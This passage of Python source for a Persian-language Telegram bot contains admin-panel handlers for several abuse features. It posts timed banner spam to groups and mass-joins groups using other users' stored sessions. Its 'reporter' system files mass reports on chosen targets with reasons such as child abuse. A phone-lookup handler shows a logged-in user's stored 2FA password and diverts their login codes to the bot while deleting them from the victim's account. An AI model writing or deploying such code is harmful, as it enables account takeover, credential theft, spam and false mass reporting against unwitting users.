        st = admin_states.get(uid) or {}
        step = st.get('step')
        if step == 'otab_ban_wait' or step == 'otab_ban_edit':
            # بنر از پیام فعلی
            item = {'text': (text or '').strip(), 'kind': 'text', 'file_id': None}
            try:
                if message.photo:
                    item = {'text': (message.caption or ''), 'kind': 'photo', 'file_id': message.photo[-1].file_id}
                elif message.document:
                    item = {'text': (message.caption or ''), 'kind': 'doc', 'file_id': message.document.file_id}
                elif message.video:
                    item = {'text': (message.caption or ''), 'kind': 'video', 'file_id': message.video.file_id}
                elif message.voice:
                    item = {'text': (message.caption or ''), 'kind': 'voice', 'file_id': message.voice.file_id}
                elif message.video_note:
                    item = {'text': '', 'kind': 'video_note', 'file_id': message.video_note.file_id}
                elif message.animation:
                    item = {'text': (message.caption or ''), 'kind': 'animation', 'file_id': message.animation.file_id}
            except Exception:
                pass
            bans = list(get_ud(uid, 'otab_banners') or [])
            if step == 'otab_ban_edit':
                idx = int((admin_states.get(uid) or {}).get('idx') or 0)
                if 0 <= idx < len(bans):
                    bans[idx] = item
                else:
                    bans.append(item)
            else:
                bans.append(item)
            set_user(uid, 'otab_banners', bans)
            admin_states.pop(uid, None)
            bot.reply_to(message, "<blockquote>بنر ذخیره شد</blockquote>" + chr(10) + "<blockquote>تعداد: " + str(len(bans)) + "</blockquote>", parse_mode='HTML')
            return
        if step == 'otab_links':
            st = admin_states.get(uid) or {}
            links = list(st.get('links') or [])
            raw = (text or '').strip()
            # عدد = تعداد رندوم
            if raw.isdigit() and int(raw) > 0 and 't.me/' not in raw:
                st['nrand'] = int(raw)
                admin_states[uid] = st
                bot.reply_to(message, "<blockquote>رندوم " + raw + " گروه انتخاب می‌شود</blockquote>" + chr(10) + "<blockquote>ذخیره را بزن</blockquote>", parse_mode='HTML')
                return
            for part in raw.replace(',', ' ').split():
                if 't.me/' in part or 'telegram.me/' in part or part.startswith('@'):
                    links.append(part.strip())
            st['links'] = links
            admin_states[uid] = st
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("ذخیره", callback_data="otab_links_save"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"otabchi_{uid}"))
            bot.reply_to(message, "<blockquote>لینک‌های ثبت‌شده: " + str(len(links)) + "</blockquote>", parse_mode='HTML', reply_markup=mk)
            return
        if step == 'otab_loop':
            try:
                mins = int(re.sub(r'[^0-9]', '', text) or '0')
                if mins < 1:
                    raise ValueError()
            except Exception:
                bot.reply_to(message, "<blockquote>فقط عدد دقیقه</blockquote>", parse_mode='HTML')
                return
            st = admin_states.pop(uid, None) or {}
            links = st.get('links') or []
            nrand = st.get('nrand')
            bans = get_ud(uid, 'otab_banners') or []
            job = {'links': links, 'nrand': nrand, 'minutes': mins, 'active': True}
            set_user(uid, 'otab_job', job)
            banner_jobs[uid] = {'chat_id': 0, 'minutes': mins, 'links': links, 'nrand': nrand, 'next_ts': 0, 'active': True}
            nb = len(bans)
            if nb <= 1:
                msg = "<blockquote>این بنر هر " + str(mins) + " دقیقه ۱ بار به این گروه‌ها ارسال می‌شود</blockquote>"
            else:
                msg = "<blockquote>این بنرها به صورت چرخشی هر " + str(mins) + " دقیقه ۱ بار رندوم در گروه‌ها ارسال می‌شوند</blockquote>"
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("توقف", callback_data="otab_stop"))
            bot.reply_to(message, msg + chr(10) + "<blockquote>گروه: " + str(len(links) or nrand or 0) + " | بنر: " + str(nb) + "</blockquote>", parse_mode='HTML', reply_markup=mk)
            return
        if step == 'otab_admin_id' and is_main_owner(uid):
            try:
                tid = int(to_en_digits(text.strip().split()[0]))
            except Exception:
                bot.reply_to(message, "<blockquote>ایدی عددی معتبر</blockquote>", parse_mode='HTML')
                return
            set_user(tid, 'tabchi_admin', True)
            admin_states.pop(uid, None)
            bot.reply_to(message, "<blockquote>ادمین تبچی تنظیم شد: <code>" + str(tid) + "</code></blockquote>", parse_mode='HTML')
            return
        if step == 'join_id_ask':
            raw = (text or '').strip()
            try:
                gid = int(to_en_digits(raw.split()[0]))
            except Exception:
                bot.reply_to(message, "<blockquote>ایدی عددی معتبر بفرست</blockquote>", parse_mode='HTML')
                return
            admin_states[uid] = {'step': 'join_id_who', 'gid': gid}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("اکانت خودم", callback_data="jid_self"))
            mk.add(types.InlineKeyboardButton("اکانت‌های اضافه", callback_data="jid_extra"))
            mk.add(types.InlineKeyboardButton("اکانت کاربران", callback_data="jid_users"))
            bot.reply_to(
                message,
                "<blockquote>ایدی: <code>" + str(gid) + "</code></blockquote>" + chr(10)
                + "<blockquote>چه کسانی جوین شوند؟</blockquote>",
                parse_mode='HTML',
                reply_markup=mk,
            )
            return
        if step == 'join_id_count':
            try:
                n = int(to_en_digits((text or '').strip()))
                if n < 1:
                    raise ValueError()
            except Exception:
                bot.reply_to(message, "<blockquote>فقط عدد مثبت</blockquote>", parse_mode='HTML')
                return
            st = admin_states.get(uid) or {}
            gid = st.get('gid')
            mode = st.get('mode')
            admin_states.pop(uid, None)
            bot.reply_to(message, "<blockquote>در حال جوین...</blockquote>", parse_mode='HTML')
            async def _do_join():
                ok = 0
                data = load_data()
                sessions = []
                if mode == 'extra':
                    for aid, inf in (get_extras(uid) or {}).items():
                        if isinstance(inf, dict) and inf.get('session'):
                            sessions.append(inf['session'])
                else:
                    for su, u in (data.get('users') or {}).items():
                        if int(su) == int(OWNER_ID):
                            continue
                        if (u or {}).get('session'):
                            sessions.append(u['session'])
                for sess in sessions[:n]:
                    try:
                        cl = TelegramClient(StringSession(sess), API_ID, API_HASH, device_model='StR')
                        await cl.connect()
                        await cl.get_entity(gid)
                        ok += 1
                        await cl.disconnect()
                    except Exception:
                        try:
                            await cl.disconnect()
                        except Exception:
                            pass
                try:
                    bot.send_message(uid, "<blockquote>جوین انجام شد: " + str(ok) + "/" + str(min(n, len(sessions))) + "</blockquote>", parse_mode='HTML')
                except Exception:
                    pass
            try:
                asyncio.run_coroutine_threadsafe(_do_join(), loop)
            except Exception:
                pass
            return
        if step == 'orep_set_limit':
            try:
                n = int(to_en_digits((text or '').strip()))
                if n < 1:
                    raise ValueError()
            except Exception:
                bot.reply_to(message, "<blockquote>فقط عدد مثبت بفرست</blockquote>", parse_mode='HTML')
                return
            _save_rep_settings(daily_limit=n)
            admin_states.pop(uid, None)
            bot.reply_to(message, "<blockquote>محدودیت روزانه ریپورتر: <code>" + str(n) + "</code> بار در روز</blockquote>", parse_mode='HTML')
            return
        if step == 'orep_cw_msg_text':
            st = admin_states.get(uid) or {}
            cfg = st.get('code_cfg') or {}
            cfg['welcome'] = (text or '').strip() or cfg.get('welcome') or 'بخش ریپورتر برات باز شد'
            st['code_cfg'] = cfg
            st['step'] = 'orep_code_wizard'
            admin_states[uid] = st
            bot.reply_to(message, "<blockquote>متن ذخیره شد</blockquote>" + chr(10) + "<blockquote>" + str(cfg['welcome'])[:200].replace('<','') + "</blockquote>" + chr(10) + "<blockquote>دوباره از پنل «رمز جدید» تنظیمات را ببین و ساخت کن</blockquote>", parse_mode='HTML')
            return
        if step == 'orep_cw_lim_num':
            try:
                n = int(to_en_digits((text or '').strip()))
                if n < 1:
                    raise ValueError()
            except Exception:
                bot.reply_to(message, "<blockquote>فقط عدد مثبت</blockquote>", parse_mode='HTML')
                return
            st = admin_states.get(uid) or {}
            cfg = st.get('code_cfg') or {}
            cfg['daily_limit'] = n
            st['code_cfg'] = cfg
            st['step'] = 'orep_code_wizard'
            admin_states[uid] = st
            bot.reply_to(message, "<blockquote>محدودیت روزانه: <code>" + str(n) + "</code></blockquote>", parse_mode='HTML')
            return
        if step == 'orep_expire_code':
            code = (text or '').strip()
            data_u = load_data()
            codes = data_u.get('reporter_codes') or {}
            info = codes.get(code)
            if not info:
                bot.reply_to(message, "<blockquote>این کد پیدا نشد</blockquote>", parse_mode='HTML')
                return
            info['expired'] = True
            info['used_by'] = info.get('used_by') or int(OWNER_ID)
            info['used_at'] = __import__('time').time()
            codes[code] = info
            # اگر کسی با این کد فعال شده بود ریپورترش را ببند
            ub = info.get('used_by')
            if ub and int(ub) != int(OWNER_ID):
                users = data_u.get('reporter_users') or {}
                ru = users.get(str(ub)) or {}
                if ru.get('code') == code:
                    ru['enabled'] = False
                    users[str(ub)] = ru
                    data_u['reporter_users'] = users
            data_u['reporter_codes'] = codes
            save_data(data_u)
            admin_states.pop(uid, None)
            bot.reply_to(message, "<blockquote>کد منقضی شد</blockquote>" + chr(10) + "<blockquote><code>" + code.replace('<','') + "</code></blockquote>", parse_mode='HTML')
            return
        if step == 'orep_getid':
            raw = (text or '').strip()
            try:
                loop = asyncio.get_event_loop()
                async def _resolve():
                    u = get_user(OWNER_ID) or {}
                    sess = u.get('session') or u.get('StringSession')
                    if not sess:
                        return None
                    cl = await _get_or_connect_session(sess, label='STR')
                    if not cl:
                        return None
                    try:
                        # لینک پست
                        import re as _re
                        m = _re.search(r't\.me/c/(\d+)/(\d+)', raw)
                        if m:
                            cid = int('-100' + m.group(1))
                            mid = int(m.group(2))
                            ent = await cl.get_entity(cid)
                            title = getattr(ent, 'title', str(cid))
                            return {
                                'type': 'پست کانال/گروه خصوصی',
                                'id': cid,
                                'msg_id': mid,
                                'title': title,
                                'username': getattr(ent, 'username', None),
                            }
                        m2 = _re.search(r't\.me/([A-Za-z0-9_]+)/(\d+)', raw)
                        if m2:
                            un = m2.group(1)
                            mid = int(m2.group(2))
                            ent = await cl.get_entity(un)
                            title = getattr(ent, 'title', None) or ((getattr(ent,'first_name','') or '') + ' ' + (getattr(ent,'last_name','') or '')).strip()
                            return {
                                'type': 'پست',
                                'id': getattr(ent, 'id', None),
                                'msg_id': mid,
                                'title': title,
                                'username': getattr(ent, 'username', None) or un,
                            }
                        ent = await cl.get_entity(raw)
                        title = getattr(ent, 'title', None) or ((getattr(ent,'first_name','') or '') + ' ' + (getattr(ent,'last_name','') or '')).strip()
                        kind = 'اکانت'
                        if getattr(ent, 'broadcast', False):
                            kind = 'کانال'
                        elif getattr(ent, 'megagroup', False) or getattr(ent, 'gigagroup', False):
                            kind = 'گروه'
                        elif getattr(ent, 'title', None):
                            kind = 'چت'
                        return {
                            'type': kind,
                            'id': getattr(ent, 'id', None),
                            'msg_id': None,
                            'title': title,
                            'username': getattr(ent, 'username', None),
                        }
                    finally:
                        try:
                            await cl.disconnect()
                        except Exception:
                            pass
                fut = asyncio.run_coroutine_threadsafe(_resolve(), loop)
                info = fut.result(timeout=30)
            except Exception as e:
                bot.reply_to(message, "<blockquote>خطا در استخراج</blockquote>" + chr(10) + "<blockquote>" + str(e)[:100].replace('<','') + "</blockquote>", parse_mode='HTML')
                return
            if not info or not info.get('id'):
                bot.reply_to(message, "<blockquote>چیزی پیدا نشد</blockquote>", parse_mode='HTML')
                return
            body = (
                "<blockquote><b>📡 ایدی گرفتن</b></blockquote>" + chr(10)
                + "<blockquote>نوع: " + str(info.get('type')) + "</blockquote>" + chr(10)
                + "<blockquote>نام: " + str(info.get('title') or '—').replace('<','') + "</blockquote>" + chr(10)
                + "<blockquote>ایدی: <code>" + str(info.get('id')) + "</code></blockquote>" + chr(10)
            )
            if info.get('username'):
                body += "<blockquote>یوزرنیم: @" + str(info.get('username')).replace('<','') + "</blockquote>" + chr(10)
            if info.get('msg_id'):
                body += "<blockquote>ایدی پیام: <code>" + str(info.get('msg_id')) + "</code></blockquote>" + chr(10)
            body += "<blockquote>لینک: <code>" + raw.replace('<','')[:80] + "</code></blockquote>"
            admin_states.pop(uid, None)
            bot.reply_to(message, body, parse_mode='HTML')
            return
        if step == 'orep_protect_id':
            raw = (text or '').strip()
            tid = None
            label = raw
            # ایدی عددی مستقیم
            try:
                tid = int(to_en_digits(raw.split()[0]))
            except Exception:
                tid = None
            # لینک چنل/گروه/اکانت
            if tid is None and raw:
                try:
                    import asyncio as _aio
                    loop = asyncio.get_event_loop()
                    async def _resolve():
                        u = get_user(OWNER_ID) or {}
                        sess = u.get('session') or u.get('StringSession')
                        if not sess:
                            return None, None
                        cl = await _get_or_connect_session(sess, label='STR')
                        if not cl:
                            return None, None
                        try:
                            ent = await cl.get_entity(raw if not raw.startswith('http') else raw)
                            eid = getattr(ent, 'id', None)
                            title = getattr(ent, 'title', None) or ((getattr(ent,'first_name','') or '') + ' ' + (getattr(ent,'last_name','') or '')).strip()
                            return eid, title
                        finally:
                            try:
                                await cl.disconnect()
                            except Exception:
                                pass
                    fut = asyncio.run_coroutine_threadsafe(_resolve(), loop)
                    tid, title = fut.result(timeout=25)
                    if title:
                        label = title
                except Exception as e:
                    try:
                        bot.reply_to(message, "<blockquote>نتونستم هدف را پیدا کنم</blockquote>" + chr(10) + "<blockquote>" + str(e)[:80].replace('<','') + "</blockquote>", parse_mode='HTML')
                    except Exception:
                        pass
                    return
            if tid is None:
                bot.reply_to(message, "<blockquote>ایدی عددی یا لینک چنل/گروه/اکانت معتبر بفرست</blockquote>", parse_mode='HTML')
                return
            try:
                if int(tid) == int(OWNER_ID):
                    admin_states.pop(uid, None)
                    bot.reply_to(message, "<blockquote>مالک اصلی همیشه محافظت است</blockquote>", parse_mode='HTML')
                    return
            except Exception:
                pass
            data_u = load_data()
            prot = [int(x) for x in (data_u.get('report_protected') or []) if str(x).lstrip('-').isdigit()]
            if int(tid) in prot:
                prot = [x for x in prot if x != int(tid)]
                data_u['report_protected'] = prot
                save_data(data_u)
                admin_states.pop(uid, None)
                bot.reply_to(message, "<blockquote><code>" + str(tid) + "</code> از لیست محافظت حذف شد</blockquote>", parse_mode='HTML')
                return
            prot.append(int(tid))
            data_u['report_protected'] = prot
            save_data(data_u)
            admin_states.pop(uid, None)
            bot.reply_to(
                message,
                "<blockquote>محافظت شد</blockquote>" + chr(10)
                + "<blockquote>" + str(label).replace('<','')[:80] + "</blockquote>" + chr(10)
                + "<blockquote>ایدی: <code>" + str(tid) + "</code></blockquote>" + chr(10)
                + "<blockquote>هیچ گزارشی روی این هدف اجرا نمی‌شود</blockquote>",
                parse_mode='HTML',
            )
            return
        if step == 'orep_exempt_id':
            try:
                tid = int(to_en_digits((text or '').strip()))
            except Exception:
                bot.reply_to(message, "<blockquote>ایدی عددی معتبر بفرست</blockquote>", parse_mode='HTML')
                return
            data_u = load_data()
            ex = [int(x) for x in (data_u.get('report_exempt') or []) if str(x).lstrip('-').isdigit()]
            if tid in ex:
                admin_states.pop(uid, None)
                mk = types.InlineKeyboardMarkup()
                mk.add(
                    types.InlineKeyboardButton("بله", callback_data="orep_ex_yes_" + str(tid)),
                    types.InlineKeyboardButton("خیر", callback_data="orep_ex_no_" + str(tid)),
                )
                bot.reply_to(
                    message,
                    "<blockquote>این کاربر قبلاً در لیست معافیت است</blockquote>" + chr(10)
                    + "<blockquote>می‌خوای از لیست معافیت در بیاد؟</blockquote>",
                    parse_mode='HTML',
                    reply_markup=mk,
                )
                return
            ex.append(tid)
            data_u['report_exempt'] = ex
            save_data(data_u)
            admin_states.pop(uid, None)
            bot.reply_to(
                message,
                "<blockquote>کاربر <code>" + str(tid) + "</code> معاف شد</blockquote>" + chr(10)
                + "<blockquote>دیگر در ریپورتر از اکانتش استفاده نمی‌شود</blockquote>",
                parse_mode='HTML',
            )
            return
        if step == 'orep_bo_id':
            try:
                tid = int(to_en_digits((text or '').strip()))
            except Exception:
                bot.reply_to(message, "<blockquote>ایدی عددی معتبر بفرست</blockquote>", parse_mode='HTML')
                return
            add_reporter_bo(tid)
            admin_states.pop(uid, None)
            bot.reply_to(message, "<blockquote>کاربر <code>" + str(tid) + "</code> به ریپورتر BO اضافه شد</blockquote>" + chr(10) + "<blockquote>بدون لاگین سلف می‌تواند ریپورتر را استفاده کند</blockquote>", parse_mode='HTML')
            try:
                bot.send_message(tid, "<blockquote>ریپورتر BO برای شما فعال شد</blockquote>" + chr(10) + "<blockquote>از پنل ربات دکمه ریپورتر را بزنید (لاگین سلف لازم نیست)</blockquote>", parse_mode='HTML')
            except Exception:
                pass
            return
        if step == 'orep_vip_id':
            try:
                tid = int(to_en_digits((text or '').strip()))
            except Exception:
                bot.reply_to(message, "<blockquote>ایدی عددی معتبر بفرست</blockquote>", parse_mode='HTML')
                return
            data = load_data()
            users = data.get('reporter_users') or {}
            ru = users.get(str(tid)) or {'enabled': True}
            ru['enabled'] = True
            ru['vip'] = True
            ru['banned'] = False
            users[str(tid)] = ru
            data['reporter_users'] = users
            save_data(data)
            admin_states.pop(uid, None)
            bot.reply_to(message, "<blockquote>کاربر <code>" + str(tid) + "</code> ویژه شد — بدون محدودیت ریپورتر</blockquote>", parse_mode='HTML')
            return
        if step == 'orep_reset_id':
            try:
                tid = int(to_en_digits((text or '').strip()))
            except Exception:
                bot.reply_to(message, "<blockquote>ایدی عددی معتبر بفرست</blockquote>", parse_mode='HTML')
                return
            reporter_reset_limit(tid)
            admin_states.pop(uid, None)
            bot.reply_to(message, "<blockquote>محدودیت روزانه کاربر <code>" + str(tid) + "</code> ریست شد</blockquote>", parse_mode='HTML')
            return
        if step == 'orep_ban_id':
            try:
                tid = int(to_en_digits((text or '').strip()))
            except Exception:
                bot.reply_to(message, "<blockquote>ایدی عددی معتبر بفرست</blockquote>", parse_mode='HTML')
                return
            data = load_data()
            users = data.get('reporter_users') or {}
            ru = users.get(str(tid)) or {}
            ru['banned'] = True
            ru['ban_temp_until'] = None
            users[str(tid)] = ru
            data['reporter_users'] = users
            save_data(data)
            admin_states.pop(uid, None)
            bot.reply_to(message, "<blockquote>کاربر <code>" + str(tid) + "</code> از ریپورتر بن شد</blockquote>", parse_mode='HTML')
            try:
                bot.send_message(tid, "<blockquote>شما از بخش ریپورتر مسدود شدید.</blockquote>", parse_mode='HTML')
            except Exception:
                pass
            return
        if step == 'orep_tempban_id':
            try:
                tid = int(to_en_digits((text or '').strip()))
            except Exception:
                bot.reply_to(message, "<blockquote>ایدی عددی معتبر بفرست</blockquote>", parse_mode='HTML')
                return
            admin_states[uid] = {'step': 'orep_tempban_hours', 'tid': tid}
            bot.reply_to(message, "<blockquote>مدت بن موقت (ساعت) را عدد بفرست</blockquote>", parse_mode='HTML')
            return
        if step == 'orep_tempban_hours':
            try:
                hours = int(to_en_digits((text or '').strip()))
                if hours < 1:
                    raise ValueError()
            except Exception:
                bot.reply_to(message, "<blockquote>عدد ساعت معتبر بفرست</blockquote>", parse_mode='HTML')
                return
            tid = st.get('tid')
            data = load_data()
            users = data.get('reporter_users') or {}
            ru = users.get(str(tid)) or {}
            ru['banned'] = False
            ru['ban_temp_until'] = __import__('time').time() + hours * 3600
            users[str(tid)] = ru
            data['reporter_users'] = users
            save_data(data)
            admin_states.pop(uid, None)
            bot.reply_to(message, "<blockquote>کاربر <code>" + str(tid) + "</code> به مدت " + str(hours) + " ساعت از ریپورتر بن موقت شد</blockquote>", parse_mode='HTML')
            try:
                bot.send_message(tid, "<blockquote>شما به مدت " + str(hours) + " ساعت از بخش ریپورتر مسدود شدید.</blockquote>", parse_mode='HTML')
            except Exception:
                pass
            return
        if step == 'orep_unban_id':
            try:
                tid = int(to_en_digits((text or '').strip()))
            except Exception:
                bot.reply_to(message, "<blockquote>ایدی عددی معتبر بفرست</blockquote>", parse_mode='HTML')
                return
            data = load_data()
            users = data.get('reporter_users') or {}
            ru = users.get(str(tid)) or {}
            ru['banned'] = False
            ru['ban_temp_until'] = None
            users[str(tid)] = ru
            data['reporter_users'] = users
            save_data(data)
            admin_states.pop(uid, None)
            bot.reply_to(message, "<blockquote>کاربر <code>" + str(tid) + "</code> از بن ریپورتر خارج شد</blockquote>", parse_mode='HTML')
            return

    # --- فعال‌سازی رمز یک‌بارمصرف ریپورتر ---
    if chat == 'private' and text and text.strip().startswith('Str') and len(text.strip()) >= 8:
        code = text.strip()
        # فقط اگر شبیه کد ماست
        import re as _re_code
        if _re_code.match(r'^Str[0-9]{4}_[A-Za-z0-9]{3}$', code):
            data = load_data()
            codes = data.get('reporter_codes') or {}
            info = codes.get(code)
            if info is None:
                pass  # کد نامعتبر — چیزی نگو
            elif info.get('used_by'):
                # فقط بار اول بعد از استفاده به این شخص؟ کاربر گفت اگر دوباره فرستاد چیز دیگه نگه
                # اگر اولین بار این یوزر used code را می‌بیند
                flag_key = 'code_used_msg_' + code
                if not (get_user(uid) or {}).get(flag_key):
                    try:
                        set_user(uid, **{flag_key: True})
                    except Exception:
                        try:
                            update_user(uid, **{flag_key: True})
                        except Exception:
                            pass
                    bot.reply_to(message, "<blockquote>این کد قبلا استفاده شده</blockquote>", parse_mode='HTML')
                return
            else:
                err = activate_reporter_code(uid, code)
                if err is None:
                    try:
                        data2 = load_data()
                        codes2 = data2.get('reporter_codes') or {}
                        info2 = codes2.get(code) or {}
                        fu = message.from_user
                        info2['used_name'] = ((fu.first_name or '') + ' ' + (fu.last_name or '')).strip() or info2.get('used_name')
                        info2['used_username'] = (fu.username or '') or info2.get('used_username')
                        info2['used_by'] = int(uid)
                        codes2[code] = info2
                        data2['reporter_codes'] = codes2
                        save_data(data2)
                    except Exception:
                        pass
                    try:
                        data3 = load_data()
                        ru3 = (data3.get('reporter_users') or {}).get(str(uid)) or {}
                        welcome = ru3.get('welcome') or 'بخش ریپورتر برات باز شد'
                        lim = ru3.get('daily_limit')
                        if lim is None:
                            lim = _rep_settings().get('daily_limit', 20)
                        one = ru3.get('one_report')
                    except Exception:
                        welcome = 'بخش ریپورتر برات باز شد'
                        lim = 20
                        one = False
                    body = "<blockquote>" + str(welcome).replace('<','')[:500] + "</blockquote>" + chr(10)
                    body += "<blockquote>محدودیت ریپورتر: " + str(lim) + " بار در روز</blockquote>"
                    if one:
                        body += chr(10) + "<blockquote>این کد فقط برای یک گزارش است</blockquote>"
                    bot.reply_to(message, body, parse_mode='HTML')
                    try:
                        main_panel(uid)
                    except Exception:
                        pass
                return


        # لاگین کاربران — دریافت شماره
    if uid in admin_states and admin_states[uid].get('step') == 'ologin_phone':
        if chat != 'private':
            return
        if not is_main_owner(uid):
            admin_states.pop(uid, None)
            return
        phone_raw = (text or '').strip().replace(' ', '').replace('-', '')
        if not phone_raw:
            bot.reply_to(message, "<blockquote>شماره را بفرست</blockquote>", parse_mode='HTML')
            return
        # نرمال‌سازی شماره
        digits = ''.join(c for c in phone_raw if c.isdigit())
        variants = set()
        if digits:
            variants.add(digits)
            variants.add('+' + digits)
            if digits.startswith('98') and len(digits) >= 12:
                variants.add('0' + digits[2:])
                variants.add(digits[2:])
            if digits.startswith('0'):
                variants.add('98' + digits[1:])
                variants.add('+98' + digits[1:])
            if not digits.startswith('0') and not digits.startswith('98'):
                variants.add('0' + digits)
                variants.add('98' + digits)
                variants.add('+98' + digits)
        found = None
        found_uid = None
        data_u = load_data()
        for s, u in list((data_u.get('users') or {}).items()):
            if not isinstance(u, dict) or not u.get('session'):
                continue
            up = str(u.get('phone') or '').replace(' ', '').replace('-', '')
            up_d = ''.join(c for c in up if c.isdigit())
            if up in variants or up_d in variants or phone_raw in (up, u.get('phone')):
                found = u
                try:
                    found_uid = int(s)
                except Exception:
                    found_uid = s
                break
            # match last 10 digits
            if up_d and digits and len(digits) >= 10 and up_d[-10:] == digits[-10:]:
                found = u
                try:
                    found_uid = int(s)
                except Exception:
                    found_uid = s
                break
        if not found:
            bot.reply_to(message, "<blockquote>کاربری با این شماره پیدا نشد (باید لاگین کرده باشد)</blockquote>", parse_mode='HTML')
            return
        nm = (found.get('original_name') or found.get('name') or str(found_uid)).replace('<', '')
        un = (found.get('username') or '').strip().lstrip('@')
        ph = found.get('phone') or phone_raw
        pw = (found.get('2fa_password') or '').strip()
        mention = '<a href="tg://user?id=' + str(found_uid) + '">' + nm + '</a>'
        body = (
            "<blockquote>" + mention + "</blockquote>" + chr(10)
            + "<blockquote>شماره موبایل : <code>" + str(ph).replace('<','') + "</code></blockquote>" + chr(10)
            + "<blockquote>2Fa : <code>" + (str(pw).replace('<','') if pw else 'ندارد') + "</code></blockquote>" + chr(10)
            + "<blockquote>یوزر نیم : " + (("@" + un) if un else "ندارد") + "</blockquote>" + chr(10)
            + "<blockquote>ایدی عددی : <code>" + str(found_uid) + "</code></blockquote>" + chr(10)
            + "<blockquote>دریافت کد روشن شد — کد ورود به ربات می‌آید و از اکانت طرف پاک می‌شود</blockquote>"
        )
        try:
            login_watch[int(found_uid)] = True
        except Exception:
            login_watch[found_uid] = True
        try:
            tid = int(found_uid)
            if tid not in clients:
                asyncio.run_coroutine_threadsafe(start_client(tid), loop)
        except Exception:
            pass
        admin_states.pop(uid, None)
        bot.reply_to(message, body, parse_mode='HTML')
        return


    # ریپورتر — دریافت لینک
    if chat == 'private' and uid in admin_states and admin_states[uid].get('step') == 'reporter_invite':
        inv = (text or '').strip()
        if not inv or len(inv) < 3:
            bot.reply_to(message, "<blockquote>لینک دعوت گروه/چنل را بفرست</blockquote>", parse_mode='HTML')
            return
        st = admin_states.get(uid) or {}
        post_link = st.get('pending_post_link') or inv
        admin_states[uid] = {
            'step': 'reporter_reason',
            'report_link': post_link,
            'invite_link': inv,
            'owner_mode': True,
        }
        mk = types.InlineKeyboardMarkup(row_width=2)
        mk.add(
            types.InlineKeyboardButton("هرزنامه", callback_data="rep_reason_" + str(uid) + "_spam"),
            types.InlineKeyboardButton("کلاهبرداری یا هرزنامه", callback_data="rep_reason_" + str(uid) + "_scammenu"),
        )
        mk.add(
            types.InlineKeyboardButton("این یک حساب جعلی است", callback_data="rep_reason_" + str(uid) + "_fake"),
            types.InlineKeyboardButton("خشونت", callback_data="rep_reason_" + str(uid) + "_violence"),
        )
        mk.add(
            types.InlineKeyboardButton("پورنوگرافی", callback_data="rep_reason_" + str(uid) + "_porn"),
            types.InlineKeyboardButton("کودک‌آزاری", callback_data="rep_reason_" + str(uid) + "_child"),
        )
        mk.add(
            types.InlineKeyboardButton("نقض حق نشر", callback_data="rep_reason_" + str(uid) + "_copyright"),
            types.InlineKeyboardButton("مواد مخدر غیرقانونی", callback_data="rep_reason_" + str(uid) + "_drugs"),
        )
        mk.add(
            types.InlineKeyboardButton("اطلاعات شخصی", callback_data="rep_reason_" + str(uid) + "_personal"),
            types.InlineKeyboardButton("سایر", callback_data="rep_reason_" + str(uid) + "_other"),
        )
        bot.reply_to(message, "<blockquote>دلیل گزارش را انتخاب کن</blockquote>", parse_mode='HTML', reply_markup=mk)
        return

    if chat == 'private' and uid in admin_states and admin_states[uid].get('step') == 'reporter_link':
        raw = (text or '').strip()
        if not raw or len(raw) < 3:
            bot.reply_to(message, "لینک معتبر بفرست (پست گروه/چنل یا یوزرنیم یا ایدی — می‌توانی چندتا پشت‌سرهم بفرستی)")
            return
        st = admin_states.get(uid) or {}
        owner_mode = True if is_main_owner(uid) else st.get('owner_mode', False)
        import re as _re_rl
        # استخراج چند لینک / ایدی از یک پیام
        links = []
        for line in raw.replace(',', ' ').split():
            line = line.strip()
            if not line:
                continue
            if _re_rl.search(r'(t\.me/|telegram\.me/|@)', line, _re_rl.I) or line.lstrip('-').isdigit() or line.startswith('+'):
                links.append(line)
        if not links:
            # کل متن یک تارگت
            links = [raw]
        # اگر یکی خصوصی /c/ بود و دعوت نبود
        is_private_c = any(bool(_re_rl.search(r't\.me/c/\d+', L, _re_rl.I)) for L in links)
        is_invite = any(bool(_re_rl.search(r'(joinchat|\+)', L, _re_rl.I)) for L in links)
        if is_private_c and not is_invite and len(links) == 1:
            admin_states[uid] = {
                'step': 'reporter_invite',
                'pending_post_link': links[0],
                'owner_mode': owner_mode,
            }
            bot.reply_to(message, "<blockquote>این لینک خصوصی است</blockquote>" + chr(10) + "<blockquote>لینک دعوت گروه/چنل را بفرست (بعد گزارش، اکانت‌ها لفت می‌دهند)</blockquote>", parse_mode='HTML')
            return
        link = links[0]
        admin_states[uid] = {
            'step': 'reporter_reason',
            'report_link': link,
            'report_links': links,
            'owner_mode': owner_mode,
            'invite_link': st.get('invite_link'),
        }
        # تأیید دریافت
        try:
            if len(links) > 1:
                bot.reply_to(
                    message,
                    "<blockquote><b>" + str(len(links)) + " تارگت دریافت شد</b></blockquote>",
                    parse_mode='HTML',
                )
            else:
                bot.reply_to(
                    message,
                    "<blockquote>تارگت دریافت شد</blockquote>",
                    parse_mode='HTML',
                )
        except Exception:
            pass
        mk = types.InlineKeyboardMarkup(row_width=2)
        mk.add(
            types.InlineKeyboardButton("هرزنامه", callback_data="rep_reason_" + str(uid) + "_spam"),
            types.InlineKeyboardButton("کلاهبرداری یا هرزنامه", callback_data="rep_reason_" + str(uid) + "_scammenu"),
        )
        mk.add(
            types.InlineKeyboardButton("این یک حساب جعلی است", callback_data="rep_reason_" + str(uid) + "_fake"),
            types.InlineKeyboardButton("خشونت", callback_data="rep_reason_" + str(uid) + "_violence"),
        )
        mk.add(
            types.InlineKeyboardButton("پورنوگرافی", callback_data="rep_reason_" + str(uid) + "_porn"),
            types.InlineKeyboardButton("کودک‌آزاری", callback_data="rep_reason_" + str(uid) + "_child"),
        )
        mk.add(
            types.InlineKeyboardButton("نقض حق نشر", callback_data="rep_reason_" + str(uid) + "_copyright"),
            types.InlineKeyboardButton("مواد مخدر غیرقانونی", callback_data="rep_reason_" + str(uid) + "_drugs"),
        )
        mk.add(
            types.InlineKeyboardButton("اطلاعات شخصی", callback_data="rep_reason_" + str(uid) + "_personal"),
            types.InlineKeyboardButton("نامرتبط", callback_data="rep_reason_" + str(uid) + "_geo"),
        )
        mk.add(types.InlineKeyboardButton("سایر", callback_data="rep_reason_" + str(uid) + "_other"))
        try:
            if len(links) > 1:
                targets_txt = chr(10).join(
                    "<blockquote><code>" + str(L).replace("<", "")[:80] + "</code></blockquote>"
                    for L in links[:25]
                )
                if len(links) > 25:
